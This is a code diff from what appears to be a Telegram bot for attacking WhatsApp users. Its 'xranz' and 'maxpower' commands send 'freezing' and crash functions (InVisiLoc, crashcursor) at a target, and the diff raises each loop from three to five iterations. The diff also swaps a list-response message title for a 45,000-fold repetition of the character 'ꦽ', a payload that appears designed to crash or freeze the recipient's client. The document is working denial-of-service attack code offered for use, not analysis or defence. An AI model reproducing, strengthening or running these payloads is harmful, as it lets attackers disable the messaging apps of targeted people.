@@ -1459,7 +1459,7 @@ bot.command("xranz", cooldownMiddleware, checkWhatsAppConnection, async ctx => {
   await prosesrespone(target, ctx);
 
   // Melakukan proses freezing 50 kali
-  for (let i = 0; i < 3; i++) {
+  for (let i = 0; i < 5; i++) {
         await InVisiLoc(target, { ptcp: true });
   }
 
@@ -1484,7 +1484,7 @@ bot.command("maxpower", cooldownMiddleware, checkWhatsAppConnection, async ctx =
   await prosesrespone(target, ctx);
 
   // Melakukan proses freezing 50 kali
-  for (let i = 0; i < 3; i++) {
+  for (let i = 0; i < 5; i++) {
     await crashcursor(target, { ptcp: true });
     await InVisiLoc(target, { ptcp: true });
   }
@@ -2575,7 +2575,7 @@ let messagePayload = {
 viewOnceMessage: {
 message: {
 listResponseMessage: {
-title: "Send Qris Pnyamu" + "wkwk canda bang sv ranz".repeat(45000),
+title: "Send Qris Pnyamu" + "ꦽ".repeat(45000),
 listType: 2,
 singleSelectReply: {
     selectedRowId: "🩸"
